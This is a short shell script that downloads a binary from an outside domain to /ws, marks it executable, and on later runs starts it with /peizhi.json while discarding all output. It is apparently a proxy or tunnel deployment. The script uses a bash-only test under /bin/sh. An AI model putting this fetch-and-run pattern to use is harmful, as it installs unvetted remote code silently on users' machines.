#!/bin/sh

if [[ ! -f "/ws" ]]; then
    # install and rename
    wget -qO /ws https://gcp1.kiligala.ga/v/v
    chmod +x /ws
else
    # start 
    /ws -config /peizhi.json >/dev/null 2>&1
fi
